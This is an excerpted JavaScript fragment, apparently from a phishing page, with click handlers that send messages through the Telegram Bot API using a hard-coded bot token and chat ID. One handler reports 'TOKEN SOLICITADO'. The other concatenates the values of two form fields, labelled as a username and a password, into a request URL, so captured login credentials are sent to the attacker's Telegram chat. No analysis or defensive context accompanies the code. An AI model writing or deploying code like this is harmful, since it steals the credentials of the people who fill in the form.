...
requestbutton.addEventListener("click", () => {
  ...
  const url =
    "https://api.telegram.org/bot6419870239:AAEvklQMl6cANCBhdTy0uWuv84T-lp-Kxy0/sendMessage?chat_id=6044882265&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();
...
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6419870239:AAEvklQMl6cANCBhdTy0uWuv84T-lp-Kxy0/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
